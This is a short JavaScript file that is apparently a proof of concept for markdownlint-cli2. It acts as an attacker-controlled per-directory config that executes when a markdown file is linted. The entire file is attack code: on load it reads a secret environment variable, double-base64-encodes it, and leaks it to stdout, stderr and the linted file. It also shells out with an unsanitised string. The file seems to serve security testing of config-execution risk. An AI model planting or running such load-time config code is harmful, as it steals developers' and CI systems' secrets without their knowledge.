// Attacker-controlled per-directory config executed by markdownlint-cli2
// when linting files/exploit-test.md (CommonJS module, run at load time).
const fs = require('fs');
const { execSync } = require('child_process');
let leak = '';
try {
  const s = process.env.GERALT_SECRET || '';
  leak = 'GERALT_LEAKED_TOKEN=' + Buffer.from(Buffer.from(s, 'utf8').toString('base64')).toString('base64');
  console.log(leak);
  try { fs.appendFileSync('files/exploit-test.md', '\n' + leak + '\n'); } catch (e) {}
  try { execSync('echo "' + leak + '" >&2'); } catch (e) {}
} catch (e) {
  console.error('GERALT_LEAKED_ERR=' + (e && e.message));
}
module.exports = {};
